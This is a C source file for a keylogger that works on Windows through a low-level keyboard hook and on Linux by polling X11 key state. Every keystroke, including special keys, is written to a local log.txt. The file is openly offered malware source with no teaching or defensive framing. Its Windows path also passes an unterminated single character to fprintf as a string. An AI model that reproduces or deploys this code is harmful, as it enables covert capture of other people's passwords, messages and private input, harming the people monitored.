#include <stdio.h>

#ifdef _WIN32
#include <windows.h>

// Windows keylogger implementation
FILE *logFile;

void writeToFile(char *key) {
    fprintf(logFile, "%s", key);
    fflush(logFile);
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kbdStruct->vkCode;

        if ((vkCode >= 0x30 && vkCode <= 0x5A) || vkCode == VK_SPACE) {
            char key = (vkCode == VK_SPACE) ? ' ' : (char)vkCode;
            writeToFile(&key);
        } else {
            switch (vkCode) {
                case VK_RETURN: writeToFile("[ENTER]"); break;
                case VK_BACK: writeToFile("[BACKSPACE]"); break;
                case VK_TAB: writeToFile("[TAB]"); break;
                case VK_ESCAPE: writeToFile("[ESC]"); break;
                default: writeToFile("[SPECIAL]");
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void startWindowsKeylogger() {
    logFile = fopen("log.txt", "w");
    if (!logFile) {
        printf("Failed to open log file.\n");
        return;
    }

    printf("Keylogger started on Windows. Press ESC to exit.\n");
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
    if (!hook) {
        printf("Failed to install hook.\n");
        return;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    fclose(logFile);
    printf("Keylogger stopped.\n");
}
#endif

#ifdef __linux__
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>

// Linux keylogger implementation
void startLinuxKeylogger() {
    Display *display;
    Window root;
    char keys[32];

    display = XOpenDisplay(NULL);
    if (!display) {
        printf("Failed to open X display.\n");
        return;
    }

    root = DefaultRootWindow(display);
    printf("Keylogger started on Linux. Press CTRL+C to exit.\n");

    FILE *logFile = fopen("log.txt", "w");
    if (!logFile) {
        printf("Failed to open log file.\n");
        XCloseDisplay(display);
        return;
    }

    while (1) {
        XQueryKeymap(display, keys);
        for (int i = 0; i < 256; i++) {
            if (keys[i / 8] & (1 << (i % 8))) {
                KeySym key = XKeycodeToKeysym(display, i, 0);
                if (key) {
                    fprintf(logFile, "%s ", XKeysymToString(key));
                    fflush(logFile);
                }
            }
        }
        usleep(10000); // Sleep to reduce CPU usage
    }

    fclose(logFile);
    XCloseDisplay(display);
}
#endif

int main() {
#ifdef _WIN32
    startWindowsKeylogger();
#elif __linux__
    startLinuxKeylogger();
#else
    printf("Unsupported operating system.\n");
#endif

    return 0;
}
